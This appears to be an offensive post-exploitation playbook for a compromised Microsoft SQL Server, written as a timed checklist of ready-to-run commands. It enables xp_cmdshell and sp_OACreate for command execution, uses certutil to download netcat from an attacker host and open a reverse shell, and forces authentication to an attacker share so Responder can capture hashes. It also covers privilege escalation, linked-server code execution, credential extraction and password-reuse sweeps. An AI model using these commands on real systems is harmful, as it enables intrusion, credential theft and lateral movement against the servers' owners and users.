# Playbook: MSSQL Access Obtained

## Minute 0: Confirm Access Level

```
[ ] Connect: impacket-mssqlclient domain/user:pass@target -db master -windows-auth
[ ] OR: impacket-mssqlclient sa:password@target
[ ] Check sysadmin: SELECT IS_SRVROLEMEMBER('sysadmin')
[ ] Check server principal: SELECT SYSTEM_USER, USER_NAME()
[ ] Check MSSQL version: SELECT @@VERSION
```

## Minute 5: Enable Command Execution

```
[ ] Try xp_cmdshell:
    EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
    EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    EXEC xp_cmdshell 'whoami';

[ ] If xp_cmdshell blocked, try sp_OACreate:
    DECLARE @shell INT EXEC sp_oacreate 'wscript.shell', @shell OUTPUT
    EXEC sp_oamethod @shell, 'run', null, 'whoami > C:\out.txt'

[ ] If both blocked, try CLR assembly:
    └── Needs file write → complex → fallback strategy
```

## Minute 15: Command Execution + Host Access

```
[ ] xp_cmdshell working? → Get reverse shell:
    EXEC xp_cmdshell 'powershell -enc <BASE64_REVSHELL>'

[ ] OR: Write file via xp_cmdshell:
    EXEC xp_cmdshell 'certutil -urlcache -f http://attacker/nc.exe C:\nc.exe'
    EXEC xp_cmdshell 'C:\nc.exe attacker 443 -e cmd.exe'

[ ] xp_dirtree → Hash capture:
    EXEC xp_dirtree '\\attacker-ip\test'
    └── Check Responder for captured hash

[ ] Determine service account:
    EXEC xp_cmdshell 'whoami'
    └── SYSTEM? → Full host control
    └── Network Service? → SeImpersonate → PrintSpoofer → SYSTEM
    └── Domain user? → BloodHound target
```

## Minute 30: Lateral Movement

```
[ ] Check linked servers:
    EXEC sp_linkedservers;
    EXEC sp_help_linkedsrvlogin;
    EXEC ('SELECT current_user') AT [linkedserver];

[ ] If linked server found:
    EXEC ('xp_cmdshell ''whoami''') AT [linkedserver];
    └── RCE on linked server host

[ ] Enumerate MSSQL DB:
    SELECT name FROM sys.databases;
    USE sensitive_db;
    SELECT * FROM INFORMATION_SCHEMA.TABLES;
    └── Extract creds, data

[ ] Check password reuse:
    └── SA password → Test on SSH, RDP, SMB
    └── Domain user password → Reuse sweep
```

## Milestone Checks
- [ ] SYSMAN? → xp_cmdshell → Shell
- [ ] xp_cmdshell blocked? → sp_OACreate next
- [ ] SYSTEM shell? → Full host control
- [ ] Domain account? → BloodHound + Kerberoast
- [ ] Linked server? → Lateral jump
- [ ] xp_dirtree hash captured? → Crack/relay
